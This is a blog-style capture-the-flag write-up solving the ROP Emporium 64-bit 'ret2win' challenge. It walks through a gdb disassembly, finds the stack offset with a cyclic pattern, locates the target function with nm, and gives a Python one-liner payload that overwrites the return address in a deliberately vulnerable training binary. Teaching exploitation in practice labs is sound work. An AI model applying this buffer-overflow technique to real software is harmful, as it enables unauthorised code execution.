---
layout: post
title:	"[ROP-Emporium]: Ret2Win 64-bit Challenge solution"
date:	2019-08-08 15:00:00
categories:
    - blog
tags:
    - linux
    - ropchain
    - ret2libc
    - Buffer Overflow
---
`ROP-Emporium` is a website, which offers few challenges for those who wants practicing  building ropchains.

First challenge is called: `ret2win`, which is simple and doesn't require building ropchain. It has function: `ret2win()` which executes `system("/bin/cat flag.txt")` libc call. But it isn't called in normal program execution.
{% highlight text %}
gdb-peda$ disas ret2win
Dump of assembler code for function ret2win:
   0x0000000000400811 <+0>:     push   rbp
   0x0000000000400812 <+1>:     mov    rbp,rsp
   0x0000000000400815 <+4>:     mov    edi,0x4009e0
   0x000000000040081a <+9>:     mov    eax,0x0
   0x000000000040081f <+14>:    call   0x4005f0 <printf@plt>
   0x0000000000400824 <+19>:    mov    edi,0x4009fd
   0x0000000000400829 <+24>:    call   0x4005e0 <system@plt>
   0x000000000040082e <+29>:    nop
   0x000000000040082f <+30>:    pop    rbp
   0x0000000000400830 <+31>:    ret    
End of assembler dump.
gdb-peda$ x/1s 0x4009fd
0x4009fd:       "/bin/cat flag.txt"
gdb-peda$ 
{% endhighlight %}

On line `ret2win+19` we see: ***mov edi, 0x4009fd*** which means moving address into `edi` register.

Our aim here is following:

- Find exact offset from where saved return address is being overwritten.
- Find address of `ret2win()` address and replace return address with this function's address.

So, at first create pattern via `gdbpeda` or `pattern_create.rb` from metasploit framework. I choose gdbpeda:
{% highlight text %}
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ 
{% endhighlight %}

fed into running binary and look at registers:
{% highlight text %}
RSI: 0x7ffff7fab8d0 --> 0x0 
RDI: 0x7fffffffe111 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
{% endhighlight %}

And because RBP and and saved return address is together in memory we do the following:
{% highlight text %}
gdb-peda$ pattern offset 0x6141414541412941
7007954260868540737 found at offset: 32
gdb-peda$ 
{% endhighlight %}

Offset is 32 of RBP value but we add 8 bytes to it and we have offset: 40
create pattern with size 40 and append `\xBB\xBB\xBB\xBB` to it. Program crashes and RIP register is replaced with:
{% highlight text %}
RSP: 0x7fffffffe140 --> 0x400840 (<__libc_csu_init>:    push   r15)
RIP: 0xa42424242 ('BBBB\n')
R8 : 0x60228d --> 0x0 
R9 : 0x7ffff7fb0500 (0x00007ffff7fb0500)
{% endhighlight %}


**Finding address of ret2win function**

At first, we can use `nm` tool to extract symbol information from the binary:
{% highlight text %}
root@kali:~/ROPEmporium/ret2win# nm ./ret2win
[...]

00000000004006c0 t register_tm_clones
0000000000400811 t ret2win
                 U setvbuf@@GLIBC_2.2.5
[...]
0000000000601060 D __TMC_END__
{% endhighlight %}

As we can see we got address: `0x400811` to which we have to jump via `RIP` register. Then I built simple payload to fed into the binary via python one-liner:
{% highlight text %}
$ python -c "import struct; print 'A'*40 + struct.pack('<Q', 0x400811)" > payload.txt
{% endhighlight %}

result:
{% highlight text %}
root@kali:~/ROPEmporium/ret2win# cat payload.txt | ./ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
{% endhighlight %}